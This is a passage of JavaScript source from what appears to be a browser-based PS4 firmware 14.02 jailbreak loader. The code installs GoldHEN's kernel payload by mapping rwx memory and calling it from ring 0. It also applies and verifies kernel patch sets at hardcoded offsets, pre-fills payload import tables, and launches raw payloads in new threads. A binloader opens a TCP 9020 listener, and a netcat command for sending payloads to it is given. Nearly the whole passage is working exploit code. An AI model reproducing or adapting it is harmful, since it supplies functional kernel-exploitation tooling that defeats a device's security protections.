     Use the query saved before launch.html rewrote history, otherwise the
     selection is lost along with the kernel/spray parameters. */
  const payloadSearch = window.__afterglowSearch || location.search;
  const requestedPayload = new URLSearchParams(payloadSearch).get("payload");
  const skipPayload = requestedPayload === "none"
    || new URLSearchParams(payloadSearch).get("nopayload") === "1";
  if (skipPayload) {
    say("[p] payload skipped by request -- jailbreak only");
    iface.payload = null;
    iface.payloadName = null;
  } else {
  // Bundled payloads are the six names this loader was written for. Every one
  // of them is a raw image started with rawcopy=1 (no payload-byte patches);
  // the custom entries are the operator's own loader-composite builds.
  const allowedPayloads = ["hen-1402.bin", "hen.bin", "goldhen.bin", "payload.bin",
                           "debug.bin", "binloader.bin", "hello.bin",
                           "goldhen-custom.bin", "hen-custom.bin"];
  const selectedPayload = allowedPayloads.indexOf(requestedPayload) >= 0
    ? requestedPayload : "hen-1402.bin";
  say("[p] Selected payload: " + selectedPayload);
  iface.payloadName = selectedPayload;
  if (requestedPayload && requestedPayload !== selectedPayload) {
    say("[p] Unsupported payload selection rejected; using debug.bin");
  }
  say("[p] Attempting to load " + selectedPayload);
  try {
    const isGoldhen = selectedPayload.indexOf("goldhen") === 0;
    if (isGoldhen) {
      /* 14.02 path: install GoldHEN's own kernel payload. kpayload.elf is the
         build that knows where this firmware's hooks are, and its `entry`
         loads the klog, FTP, PayLoader and menu modules. The 14.00 patch blob
         is only a fallback for a build that actually matched it. */
      let installed = false;
      const kp = await fetchBytes("kpayload.elf", "g");
      if (kp) {
        const hits = is1402Payload(kp);
        say("[g] kpayload.elf carries " + hits + "/5 of the 14.02 hook addresses");
        if (hits >= 3) {
          installed = await installKernelPayload(k, kp, "kpayload.elf");
        } else {
          say("[g] kpayload.elf is not a 14.02 build -- not calling it");
        }
      } else {
        say("[g] kpayload.elf is missing -- cannot install the kernel side");
      }
      if (!installed && buildMatched) {
        say("[g] falling back to the 14.00 patch blob (this build matched it)");
        installed = await runPatchSet(k, kat, hostFree, true);
      }
      iface.patchset = installed;
      if (!installed) {
        say("[g] refusing to start " + selectedPayload + " without a kernel payload");
        iface.payload = false;
      } else {
        iface.payload = await loadPayload(selectedPayload, null,
          { rawcopy: true, base: "0x926200000" });
      }
    } else {
      /* hen-family, binloader and the raw test payload carry their own per-FW
         tables and need the pre-flight + import pre-fill; the old rawcopy path
         had neither, which is why hen.bin died here. */
      iface.payload = await loadPayloadRaw(selectedPayload);
    }
    if (iface.payload === true) {
      say("[p] " + selectedPayload + " thread started (payload-side init not confirmed)");
    } else {
      say("[p] " + selectedPayload + " was not started");
    }
  } catch (e) {
    say("[p] Error loading " + selectedPayload + ": " + (e && e.message));
  }
  }

  sayAlways("done -- jailbroken, rwx open");
  sayAlways("========================================");
  sayAlways("  JAILBREAK COMPLETE -- FW " + fwLabel());
  sayAlways("  Kernel patches: " + done + "/" + PATCHES.length + " verified, uid 0");
  if (iface.patchset === true) {
    sayAlways("  GoldHEN kernel payload: installed (kpayload.elf entry returned)");
  } else if (iface.patchset === false) {
    sayAlways("  GoldHEN kernel payload: NOT installed -- payload not started");
    if (!buildMatched) {
      sayAlways("  Reason: no 14.02 kernel payload was usable, and the 14.00 blob");
      sayAlways("  does not match this kernel. Nothing was written.");
    }
  }
  sayAlways("  Debug Settings: " + (iface.debugmenu || "not attempted")
      + (String(iface.debugmenu || "").indexOf("GoldHEN") >= 0
        ? " -- they appear once GoldHEN is running" : ""));
  if (iface.payloadName === null) {
    sayAlways("  Payload: skipped by request");
  } else if (iface.payload === true) {
    sayAlways("  Payload: " + iface.payloadName + " thread started (payload-side init not confirmed)");
  } else {
    sayAlways("  Payload: " + (iface.payloadName || "none") + " was NOT started");
  }
  sayAlways("========================================");
  return iface;
}

/* -------------------------------------------------- GoldHEN patch set */

/* The 14.02 form of the blob that used to live in patchset.bin. Every entry
   below is the *expected post-state* of the blob, taken from a kernel image
   that already had it applied. That image is not a stock kernel, so this list
   cannot confirm that the offsets are right for a stock 14.02 build -- see
   KERNEL_1402_AUDIT.md. It is used only to read back what the blob just wrote.
   The one 14.00 write that corrupted this kernel (0x628f6f, inside a call
   rel32) was moved to 0x62926f, which is instruction aligned on 14.02. */
const PATCHSET_SITES = [
  [0x0000ab4, "ff26"],       [0x0000acd, "eb"],
  [0x0000490, "00000000"],   [0x00004b5, "eb00"],
  [0x00004b9, "eb00"],       [0x00004c2, "eb"],
  [0x01b7504, "90e9"],       [0x01b7a43, "eb04"],
  [0x01b7a53, "eb04"],       [0x01b7a73, "90e9"],
  [0x01b7ab8, "90e93c01"],
  [0x01faada, "37"],         [0x01faadd, "37"],
  [0x02bd79d, "eb"],         [0x02bd7e1, "eb"],
  [0x02bd85d, "eb"],         [0x02bd8a1, "eb"],
  [0x02bda4d, "eb"],         [0x02bdefd, "eb"],
  [0x02bdfcd, "eb"],         [0x02fcb5c, "eb04"],
  [0x0391fc6, "eb"],         [0x03be3c0, "4831c0c3"],
  [0x0628684, "eb00"],       [0x062926f, "eb00"],
  [0x1102d80, "02000000"],   [0x1102dac, "01000000"],
  [0x125791, "eb48"],        [0x1257d3, "eb06"],
  [0x1257db, "4183bfa004000000"],
  [0x1257e9, "498b87d0"],    [0x1257ed, "0400"],  [0x1257ef, "00"],
  [0x1257f6, "498bb7b0"],    [0x1257fa, "0400"],  [0x1257fc, "00"],
  [0x12580e, "498b8740"],    [0x125812, "0500"],  [0x125814, "00"],
  [0x12581b, "498bb720"],    [0x12581f, "0500"],  [0x125821, "00"],
  [0x125833, "498dbfc0"],    [0x125837, "0000"],  [0x125839, "00"],
  [0x12583f, "498dbfe0"],    [0x125843, "0000"],  [0x125845, "00"],
  [0x125852, "498dbf00"],    [0x125856, "0100"],  [0x125858, "00"],
  [0x12585e, "498dbf20"],    [0x125862, "0100"],  [0x125864, "00"],
  [0x12586f, "498b"],        [0x125871, "ff"],
];

/* 0x1102d88 is deliberately absent: the blob stores LSTAR + 0x8f4 there, a
   runtime value, so it cannot be compared against a constant. */

function verifyPatchSet(k, kat) {
  let ok = 0;
  const bad = [];
  for (let i = 0; i < PATCHSET_SITES.length; i++) {
    const off = PATCHSET_SITES[i][0];
    const want = unhex(PATCHSET_SITES[i][1]);
    const got = k.read(kat(off), want.length);
    if (got && sameBytes(got, want)) ok++;
    else bad.push("0x" + off.toString(16));
  }
  say("[g] patch set verified " + ok + " of " + PATCHSET_SITES.length + " sites"
      + (bad.length ? (" -- missing " + bad.slice(0, 8).join(" ")) : ""));
  return bad.length === 0;
}

/* ------------------------------------------- GoldHEN 14.02 kernel payload

   kpayload.elf is GoldHEN's kernel payload, built for this firmware: its
   symbol table carries `ksdk_offsets_1402`, `get_kbase`, `entry`,
   `install_fakeself_hooks` and `load_{ftp,payloader,klog}_server_module`, and
   it holds no absolute kernel pointers at all (it reads LSTAR itself), so it
   is position independent and can run from any mapped page.

   `entry` is `void entry(void)` -- it calls init_ksdk itself and takes no
   arguments -- so the install is: map the ELF read/write/execute in userland,
   copy its segments, then call `entry` from ring 0 through the gate.

   This replaces the 57-write blob for 14.02. The blob was a 14.00 image; this
   payload is the one that actually knows where 14.02's hooks are. */

function elfHeader(b) {
  if (!b || b.length < 0x40) return null;
  if (!(b[0] === 0x7f && b[1] === 0x45 && b[2] === 0x4c && b[3] === 0x46)) return null;
  if (b[4] !== 2 || b[5] !== 1) return null;              // ELF64, little endian
  const u16 = function (o) { return b[o] | (b[o + 1] << 8); };
  const u32 = function (o) {
    return (b[o] | (b[o + 1] << 8) | (b[o + 2] << 16) | (b[o + 3] << 24)) >>> 0;
  };
  const u64 = function (o) {
    const lo = u32(o), hi = u32(o + 4);
    return hi * 0x100000000 + lo;
  };
  const phoff = u64(0x20), phentsize = u16(0x36), phnum = u16(0x38);
  const loads = [];
  let lo = Infinity, hi = 0;
  for (let i = 0; i < phnum; i++) {
    const o = phoff + i * phentsize;
    if (u32(o) !== 1) continue;                            // PT_LOAD
    const off = u64(o + 8), va = u64(o + 16), fs = u64(o + 32), ms = u64(o + 40);
    if (ms === 0) continue;
    loads.push({ off: off, va: va, fs: fs, ms: ms });
    if (va < lo) lo = va;
    if (va + ms > hi) hi = va + ms;
  }
  if (!loads.length) return null;
  return { entry: u64(0x18), loads: loads, lo: lo, hi: hi };
}

/* 14.02 hook addresses from the published offset set. A payload that carries
   them is the build this host knows how to call. */
function is1402Payload(b) {
  const want = [0x00642b7c, 0x00642cce, 0x00643466, 0x00644149, 0x00640b7d];
  let hits = 0;
  for (let i = 0; i < want.length; i++) {
    const v0 = want[i] & 0xff, v1 = (want[i] >>> 8) & 0xff;
    const v2 = (want[i] >>> 16) & 0xff, v3 = (want[i] >>> 24) & 0xff;
    for (let o = 0; o + 4 <= b.length; o++) {
      if (b[o] === v0 && b[o + 1] === v1 && b[o + 2] === v2 && b[o + 3] === v3) {
        hits++;
        break;
      }
    }
  }
  return hits;
}

async function installKernelPayload(k, blob, name) {
  const c = host();
  const h = elfHeader(blob);
  if (!h) { say("[g] " + name + " is not a 64-bit ELF"); return false; }
  if (h.entry < h.lo || h.entry >= h.hi) {
    say("[g] " + name + " entry is outside its own segments"); return false;
  }

  /* The payload must live at the address it was linked for. It keeps globals
     at absolute addresses up to 0x198420 -- `install_sysmodule_preload_hook`,
     which entry() calls, does `mov [0x198420], rcx` -- and those addresses are
     plain disp32, so a different base would make them point at nothing. Map
     the link base and zero a generous tail so every one of them lands inside
     our own allocation. */
  const KP_BASE = 0x100000, KP_SIZE = 0x9a000;
  if (h.lo !== KP_BASE) {
    say("[g] " + name + " is linked at 0x" + h.lo.toString(16)
        + ", not the 0x100000 this host knows -- not calling it");
    return false;
  }
  const span = h.hi - h.lo;
  say("[g] " + name + ": " + h.loads.length + " segments, span 0x" + span.toString(16)
      + ", entry +0x" + (h.entry - h.lo).toString(16));

  const want = v(KP_BASE, 0);
  const m = sc(S.mmap, want, KP_SIZE, 3, 0x1002, -1, 0);
  const base = v(m.lo, m.hi);
  if (m.i32 === -1 || (base.hi >>> 0) === 0) {
    say("[g] mmap for the kernel payload failed, errno " + c.errno()); return false;
  }
  if (!same(base, want)) {
    say("[g] 0x100000 was not available for the kernel payload (got " + text(base) + ")");
    say("[g] not forcing it -- a MAP_FIXED here would clobber whatever holds it");
    return false;
  }
  for (let o = 0; o < KP_SIZE; o += 0x1000) wr4(plus(base, o), 0);
  if (sc(S.mprotect, base, KP_SIZE, 7).i32 !== 0) {
    say("[g] mprotect rwx for the kernel payload failed, errno " + c.errno()); return false;
  }

  for (let i = 0; i < h.loads.length; i++) {
    const s = h.loads[i];
    const dst = plus(base, s.va - h.lo);
    for (let o = 0; o < s.fs; o += 8) {
      let lo = 0, hi = 0;
      for (let q = 0; q < 4; q++) lo |= (blob[s.off + o + q] || 0) << (8 * q);
      for (let q = 0; q < 4; q++) hi |= (blob[s.off + o + 4 + q] || 0) << (8 * q);
      c.p.write8(plus(dst, o), v(lo >>> 0, hi >>> 0));
    }
  }

  const entry = plus(base, h.entry - h.lo);
  say("[g] calling GoldHEN entry " + text(entry) + " in ring 0");
  /* mov rax, entry ; call rax ; mov rdx, OUT ; mov [rdx], rax
     The gate appends the completion sigil after this, so control returns. */
  k.begin()
    .hex("48b8").qw(entry)
    .hex("ffd0")
    .hex("48ba").qw(plus(k.at, OUT))
    .hex("488902");
  if (!k.run()) {
    say("[g] the ring 0 call did not complete -- kernel payload did not return");
    return false;
  }
  say("[g] GoldHEN kernel payload returned, rax=" + text(k.out()));
  return true;
}

/* Runs once, after the jailbreak and after the handles are defused. The blob
   is position independent: it fetches the kernel base through rdmsr, lifts
   write protection once, applies every write, restores it and returns. It
   lives in the libc text tail, the only region proven executable in ring 0. */
async function runPatchSet(k, kat, room, buildMatched) {
  const c = host();
  if (buildMatched === false) {
    say("[g] this kernel is not the build the GoldHEN blob was written for");
    say("[g] the blob writes 57 sites before anything can be read back, so it");
    say("[g] is not being fired -- a wrong write there is a panic, not a retry");
    say("[g] GoldHEN needs a payload built for this firmware; the jailbreak is still live");
    return false;
  }
  let pset = null;
  try {
    const r = await fetch("patchset-1402.bin?_=" + Date.now());
    if (r.ok) pset = new Uint8Array(await r.arrayBuffer());
    else say("[g] patchset-1402.bin HTTP " + r.status);
  } catch (e) {
    say("[g] patchset-1402.bin unreachable: " + (e && e.message));
  }
  if (!pset || !pset.length) {
    say("[g] no 14.02 kernel patch set -- GoldHEN will not be started without it");
    return false;
  }
  if (pset.length > OUT - BODY) {
    say("[g] the patch set does not fit in the ring 0 body area");
    return false;
  }
  wrbuf(plus(room, BODY), pset);
  const pr = c.callAddr(plus(room, GATE), [11, plus(room, BODY)]);
  const rc = pr && (pr.lo >>> 0);
  say("[g] kernel patch set " + pset.length + " bytes -> rc=0x" + (rc || 0).toString(16));
  return verifyPatchSet(k, kat);
}

/* ------------------------------------------------------- Payload Loader */

async function fetchBytes(url, tag) {
  try {
    const r = await fetch(url + (url.indexOf("?") < 0 ? "?" : "&") + "_=" + Date.now());
    if (!r.ok) { say("[" + tag + "] " + url + " HTTP " + r.status); return null; }
    return new Uint8Array(await r.arrayBuffer());
  } catch (e) {
    say("[" + tag + "] " + url + " unreachable: " + (e && e.message));
    return null;
  }
}

/* ================= 14.02 payload pre-flight and import pre-fill ============
   Ported from the Akatsuki 14.02 binloader build. A hen-family payload carries
   its own per-firmware offset tables and ring-0 patch loop, so it needs no
   loader patches -- but its entry has a firmware gate and its kernel body has
   to contain a branch for this console's firmware, and its GOT lives in the
   mmap tail behind the file end. Checking the first two statically and filling
   the third before the thread starts is what stops the "NULL call" freeze. */

/* payloads carry "BCNIP001" + 26 bytes "ip:port" for their stage beacons;
   rewrite it with this server's address so beacons reach our log. */
function patchBeaconMarker(blob, url) {
  try {
    const magic = [0x42, 0x43, 0x4e, 0x49, 0x50, 0x30, 0x30, 0x31]; /* "BCNIP001" */
    for (let i = 0; i + 34 <= blob.length; i++) {
      let ok = true;
      for (let k = 0; k < 8; k++) {
        if (blob[i + k] !== magic[k]) { ok = false; break; }
      }
      if (ok) {
        const h = String(location.host || "");
        for (let k = 0; k < 26; k++) blob[i + 8 + k] = k < h.length ? (h.charCodeAt(k) & 0xFF) : 0;
        sayServer("[p] beacon host marker patched into " + url);
        return;
      }
    }
  } catch (eMarker) {
    say("[p] beacon marker patch skipped (" + (eMarker && eMarker.message) + ")");
  }
}

function payloadEntryOff(blob) {
  if (!blob || blob[0] !== 0xe9) return -1;
  const rel = (blob[1] | (blob[2] << 8) | (blob[3] << 16) | (blob[4] << 24)) | 0;
  const e = (5 + rel) >>> 0;
  return e < blob.length ? e : -1;
}

/* hen entry gate: `sub ax, MIN ; cmp ax, RANGE ; jbe`. FW ids are fw*100. */
function payloadGate(blob, entry) {
  const end = Math.min(entry + 0x400, blob.length - 8);
  for (let i = entry; i < end; i++) {
    if (blob[i] === 0x66 && blob[i + 1] === 0x2d) {
      const sub = blob[i + 2] | (blob[i + 3] << 8);
      for (let j = i + 4; j <= Math.min(i + 12, end); j++) {
        if (blob[j] === 0x66 && blob[j + 1] === 0x3d) {
          const rng = blob[j + 2] | (blob[j + 3] << 8);
          return { min: sub, max: (sub + rng) >>> 0 };
        }
      }
    }
  }
  return null;
}

/* count `cmp ax, fwId` (66 3d <le16>) sites: the kernel body's per-FW dispatch.
   0 means the body would report "Unsupported Firmware" and install nothing. */
function payloadFwBranches(blob, fwId) {
  const lo = fwId & 0xff, hi = (fwId >>> 8) & 0xff;
  let n = 0;
  for (let i = 0; i + 3 < blob.length; i++) {
    if (blob[i] === 0x66 && blob[i + 1] === 0x3d && blob[i + 2] === lo && blob[i + 3] === hi) n++;
  }
  return n;
}

/* Extract (tail slot <- dlsym name) pairs from the blob: for every import the
   compiler emits lea rsi,[rip->name]; lea rdx,[rip->slot]; call dlsym. */
function payloadSlotPairs(blob) {
  const flen = blob.length;
  const pairs = [];
  const seen = {};
  function cstr(off) {
    if (off < 0 || off >= flen) return null;
    let end = off;
    while (end < flen && end - off < 64 && blob[end] !== 0) end++;
    if (end === off || end >= flen) return null;
    let ok = true, s = "";
    for (let i = off; i < end; i++) {
      const ch = blob[i];
      if (ch < 32 || ch > 126) { ok = false; break; }
      s += String.fromCharCode(ch);
    }
    return ok ? s : null;
  }
  for (let i = 0; i + 7 < flen; i++) {
    if (blob[i] === 0x48 && blob[i + 1] === 0x8d && blob[i + 2] === 0x15) {
      const disp = (blob[i + 3] | (blob[i + 4] << 8) | (blob[i + 5] << 16) | (blob[i + 6] << 24)) | 0;
      const slot = (i + 7 + disp) >>> 0;
      if (slot >= flen && seen[slot] === undefined) {
        for (let back = 3; back <= 24; back++) {
          const j = i - back;
          if (j < 0) break;
          if (blob[j] === 0x48 && blob[j + 1] === 0x8d && blob[j + 2] === 0x35) {
            const d2 = (blob[j + 3] | (blob[j + 4] << 8) | (blob[j + 5] << 16) | (blob[j + 6] << 24)) | 0;
            const name = cstr((j + 7 + d2) >>> 0);
            if (name && name.length >= 3) { seen[slot] = 1; pairs.push({ slot: slot, name: name }); break; }
          }
        }
      }
    }
  }
  return pairs;
}

/* Resolve the payload's import slots BEFORE its thread runs, so a failed
   self-bootstrap cannot leave a zero slot for `call [slot]`. Every write is a
   dlsym result -- never a guess. */
function fillPayloadGOT(entry, blob, scratchOff) {
  const c = host();
  const pairs = payloadSlotPairs(blob);
  if (!pairs.length) {
    sayServer("[p] got pre-fill: no import pairs in blob -- skipping (payload bootstraps itself)");
    return 0;
  }
  const S_GETLIST = 592, S_DLSYM = 591, S_LOADPRX = 594;
  function stub(off, num) {
    codeAt(entry, off)
      .hex("b8").dw(num)
      .hex("4c8bd1")
      .hex("0f05")
      .hex("c3");
  }
  const STUB_GET = scratchOff, STUB_SYM = scratchOff + 0x20, STUB_LPRX = scratchOff + 0x40;
  const HBUF = scratchOff + 0x60, HOUT = scratchOff + 0x460;
  const DOUT = scratchOff + 0x470, NBUF = scratchOff + 0x480;
  stub(STUB_GET, S_GETLIST);
  stub(STUB_SYM, S_DLSYM);
  stub(STUB_LPRX, S_LOADPRX);

  function dlsym(handle, name) {
    if (!handle) return null;
    for (let i = 0; i < name.length; i++) wr1(plus(entry, NBUF + i), name.charCodeAt(i));
    wr1(plus(entry, NBUF + name.length), 0);
    const rc = c.callAddr(plus(entry, STUB_SYM), [handle, plus(entry, NBUF), plus(entry, DOUT)]);
    if (!rc || rc.i32 !== 0) return null;
    const a = c.p.read8(plus(entry, DOUT));
    return (a.low >>> 0 || a.hi >>> 0) ? a : null;
  }
  function loadprx(name) {
    for (let i = 0; i < name.length; i++) wr1(plus(entry, NBUF + i), name.charCodeAt(i));
    wr1(plus(entry, NBUF + name.length), 0);
    wr4(plus(entry, HOUT), 0);
    c.callAddr(plus(entry, STUB_LPRX), [plus(entry, NBUF), 0, plus(entry, HOUT)]);
    return c.p.read4(plus(entry, HOUT)) >>> 0;
  }

  let kernelH = loadprx("libkernel_web.sprx");
  if (!kernelH || !dlsym(kernelH, "__error")) kernelH = loadprx("libkernel.sprx");
  if (!kernelH || !dlsym(kernelH, "__error")) kernelH = 0;
  let libcH = loadprx("libSceLibcInternal.sprx");
  if (!libcH || !dlsym(libcH, "malloc")) libcH = 0;

  if (!kernelH || !libcH) {
    for (let i = 0; i < 256 * 4; i += 4) wr4(plus(entry, HBUF + i), 0);
    wr4(plus(entry, HOUT), 0);
    const rc = c.callAddr(plus(entry, STUB_GET), [plus(entry, HBUF), 256, plus(entry, HOUT)]);
    if (rc && rc.i32 === 0) {
      const n = c.p.read4(plus(entry, HOUT)) | 0;
      if (n > 0 && n <= 256) {
        for (let i = 0; i < n && (!kernelH || !libcH); i++) {
          const h = c.p.read4(plus(entry, HBUF + i * 4)) >>> 0;
          if (!h) continue;
          if (!kernelH && dlsym(h, "__error")) kernelH = h;
          else if (!libcH && dlsym(h, "malloc")) libcH = h;
        }
      }
    }
  }
  if (!kernelH && !libcH) {
    sayServer("[p] got pre-fill: could not resolve any module handle -- payload relies on its own bootstrap");
    return 0;
  }

  let filled = 0, missing = [];
  for (let i = 0; i < pairs.length; i++) {
    const a = dlsym(kernelH, pairs[i].name) || dlsym(libcH, pairs[i].name);
    if (a) { c.p.write8(plus(entry, pairs[i].slot), a); filled++; }
    else if (missing.length < 8) missing.push(pairs[i].name);
  }
  sayServer("[p] got pre-fill: " + filled + "/" + pairs.length + " import slots resolved"
      + " (kernel handle " + text(v(kernelH, 0)) + ", libc handle " + text(v(libcH, 0)) + ")");
  if (missing.length) sayServer("[p] got pre-fill: unresolved (payload will retry itself): " + missing.join(", "));
  return filled;
}


/* Raw payload loader for the 14.02 hen-family and the binloader stub:
   static firmware pre-flight, a 256 KB tail for the stub's GOT, verified copy,
   import pre-fill, then the thread. No hardcoded loader patches -- those were
   mid-instruction on this build and were the old freeze. */
async function loadPayloadRaw(url, patches, vorab) {
  const c = host();
  let blob = vorab || null;
  if (blob === null) {
    blob = await fetchBytes(url, "p");
    if (blob === null) return false;
  }
  if (!blob.length) { say("[p] " + url + " is empty"); return false; }
  if (blob[0] !== 0xe9) {
    say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
    return false;
  }

  patchBeaconMarker(blob, url);

  const fwKey = fwLabel();
  const fwId = /^[0-9]+\.[0-9]+$/.test(fwKey) ? parseInt(fwKey.replace(".", ""), 10) : null;
  const entryOff = payloadEntryOff(blob);
  const gate = entryOff >= 0 ? payloadGate(blob, entryOff) : null;
  const binloaderStub = /(^|\/)binloader[^\/]*\.bin$/.test(url);

  if (fwId === null) {
    say("[p] pre-flight: console firmware unknown -- refusing to start " + url);
    return false;
  }
  if (binloaderStub) {
    sayServer("[p] pre-flight: binloader stub is FW-independent (raw syscalls only) -- FW checks skipped");
  } else {
    if (!gate) {
      say("[p] pre-flight: entry FW gate not found in " + url + " -- refusing (unknown payload family)");
      return false;
    }
    if (fwId < gate.min || fwId > gate.max) {
      say("[p] pre-flight: " + url + " entry gate accepts FW "
          + (gate.min / 100).toFixed(2) + "-" + (gate.max / 100).toFixed(2)
          + ", console is " + fwKey + " -- refusing");
      return false;
    }
    const branches = payloadFwBranches(blob, fwId);
    if (branches === 0) {
      say("[p] pre-flight: " + url + " kernel body has NO " + fwKey + " branch (0 cmp sites) --");
      say("[p] the body would notify 'Unsupported Firmware' and install nothing -- refusing");
      return false;
    }
    sayServer("[p] pre-flight OK: gate accepts " + fwKey + ", body has " + branches + " FW branch sites");
  }

  const size = (blob.length + 0x40000) & ~0x3fff;
  const m = sc(S.mmap, 0, size, 3, 0x1002, -1, 0);
  const entry = v(m.lo, m.hi);
  if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
    say("[p] mmap failed, errno " + c.errno()); return false;
  }
  for (let o = 0; o < size; o += 0x1000) wr4(plus(entry, o), 0);
  if (sc(S.mprotect, entry, size, 7).i32 !== 0) {
    say("[p] mprotect rwx failed, errno " + c.errno()); return false;
  }
  codeAt(entry, 0).hex("c3");
  const probe = c.callAddr(entry, []);
  if (probe === undefined || probe === null) {
    say("[p] entry page does not execute in ring 3 -- stopping"); return false;
  }
  sayServer("[p] entry page executes in ring 3, loading payload");

  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
  }
  for (let o = 0; o < blob.length; o += 8) {
    let lo = 0, hi = 0;
    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
    const q = c.p.read8(plus(entry, o));
    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
      say("[p] copy mismatch at 0x" + o.toString(16)); return false;
    }
  }

  if (patches && patches.length) {
    for (let pi = 0; pi < patches.length; pi++) {
      const pt = patches[pi];
      const poff = pt.off >>> 0;
      const nb = unhex(pt.hex);
      const pre = pt.pre ? unhex(pt.pre) : null;
      if (pre) {
        let mismatch = -1;
        for (let o = 0; o < pre.length && mismatch < 0; o++) {
          if (c.p.read1(plus(entry, poff + o)) !== pre[o]) mismatch = o;
        }
        if (mismatch >= 0) {
          say("[p] patch @0x" + poff.toString(16) + " pre-byte mismatch at +" + mismatch
              + " -- refusing to patch " + url);
          return false;
        }
      }
      for (let o = 0; o < nb.length; o++) wr1(plus(entry, poff + o), nb[o]);
      sayServer("[p] patch @0x" + poff.toString(16) + " verified+applied (" + pt.hex + ")");
    }
  }

  sayServer("[p] payload copied and verified, pre-filling import slots");
  const scratchOff = (blob.length + 0xfff) & ~0xfff;
  try { fillPayloadGOT(entry, blob, scratchOff); }
  catch (eGot) { sayServer("[p] got pre-fill errored (" + (eGot && eGot.message) + ") -- payload relies on its own bootstrap"); }

  const SLOT_1352 = 0x3cb9c00;
  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
    ? c.off.wk___imp_pthread_create : SLOT_1352;
  if (!c.webkitBase || !c.libkernelBase) {
    say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
    return false;
  }
  const fnr = c.p.read8(c.webkitBase.add32(slot));
  const fn = v(fnr.low, fnr.hi);
  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
    say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
        + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
    return false;
  }
  sayServer("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));

  const thr = alloc(8);
  thr.u8.fill(0);
  const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
  const handle = qAt(thr, 0);
  const started = rc === 0 && (handle.hi >>> 0) > 0;
  if (started) {
    sayServer("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc + " -- running");
  } else {
    say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc + " -- did NOT start");
  }

  if (binloaderStub && started) {
    try {
      const SYS_CONNECT = 98;
      codeAt(entry, scratchOff)
        .hex("b8").dw(SYS_CONNECT)
        .hex("4c8bd1")
        .hex("0f05")
        .hex("c3");
      const sa = alloc(16); sa.u8.fill(0);
      sa.u8[0] = 16; sa.u8[1] = 2;              /* len, AF_INET           */
      sa.u8[2] = 0x23; sa.u8[3] = 0x3c;         /* port 9020, big-endian  */
      sa.u8[4] = 127; sa.u8[7] = 1;             /* 127.0.0.1              */
      const pfd = (S.socket !== undefined) ? sc(S.socket, 2, 1, 0).i32 : -1;
      if (pfd >= 0) {
        await new Promise(function (ok) { setTimeout(ok, 400); });
        const prc = c.callAddr(plus(entry, scratchOff), [pfd, sa.at, 16]).i32;
        if (S.close !== undefined) sc(S.close, pfd);
        if (prc === 0) {
          say("binloader listening on port 9020");
          sayServer("[p] binloader probe OK -- TCP 9020 is OPEN. Send raw (hen.bin) or ELF64 (hello.elf): nc --send-only <PS4-IP> 9020 < hen.bin (Ncat) | nc -q0 <PS4-IP> 9020 < payload.bin (OpenBSD nc). The stub beacons every event to this log and re-listens after each payload.");
        } else {
          say("[p] binloader: probe connect rc=" + prc + " -- listener NOT reachable (stub died? check banner)");
        }
      } else {
        say("[p] binloader: probe socket() failed -- cannot verify listener");
      }
    } catch (eProbe) {
      say("[p] binloader: probe errored (" + (eProbe && eProbe.message) + ") -- cannot verify listener");
    }
  }
  return started;
}

async function loadPayload(url, vorab, opts) {
  opts = opts || {};
  say("[FLOW-DIAG] stage=payload-entry file=" + url);
  const c = host();
  const RAWC = opts.rawcopy !== undefined
    ? !!opts.rawcopy
    : !!(c.params && c.params.get("rawcopy") === "1");
  let blob = vorab || null;
  if (blob === null) {
    saySync("[p] 1 fetch blob " + url);
    blob = await fetchBytes(url, "p");
    if (blob === null) return false;
  }

  if (!blob.length) { say("[p] " + url + " is empty"); return false; }
  if (blob[0] !== 0xe9) {
    say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
    return false;
  }

  // Read-only payload entry inspection: x86 near JMP at file offset zero.
  // The loader calls the mapping base; the JMP target is the payload's first
  // control-flow destination. This does NOT establish firmware compatibility.
  const displacement = (blob[1] | (blob[2] << 8) | (blob[3] << 16) | (blob[4] << 24));
  const jumpTarget = 5 + displacement;
  const entryInBounds = jumpTarget >= 0 && jumpTarget < blob.length;
  say("[PDIAG] phase=entry-inspect | file=" + url + " | bytes=" + blob.length
      + " | opcode=0xe9 | relativeTarget=0x" + jumpTarget.toString(16)
      + " | targetInFile=" + entryInBounds + " | entryAssumption=mapping-base");
  if (!entryInBounds) {
    say("[PDIAG] phase=entry-rejected | reason=relative-jump-out-of-bounds");
    return false;
  }

  const size = (blob.length + 0x3fff) & ~0x3fff;

  // Flat images linked at an absolute address (goldhen.bin = loader linked at
  // 0x926200000 + embedded kpayload at +0x6480) cannot run from a random mmap.
  // A "base" parameter maps them there with MAP_FIXED (0x10) so absolute
  // literals and the embedded kpayload land where the linker put them.
  let fixedBase = null;
  const baseArg = opts.base !== undefined
    ? opts.base
    : (c.params ? c.params.get("base") : null);
  if (baseArg) {
    const h = String(baseArg).replace(/^0x/i, "");
    const lo = parseInt(h.slice(-8) || "0", 16) >>> 0;
    const hi = parseInt(h.slice(0, -8) || "0", 16) >>> 0;
    fixedBase = v(lo, hi);
    say("[p] fixed base requested " + text(fixedBase) + " (MAP_FIXED)");
  }
  saySync("[p] 2 mmap+fault size=0x" + size.toString(16));
  const m = sc(S.mmap, fixedBase || 0, size, 3, fixedBase ? 0x1012 : 0x1002, -1, 0);
  const entry = v(m.lo, m.hi);
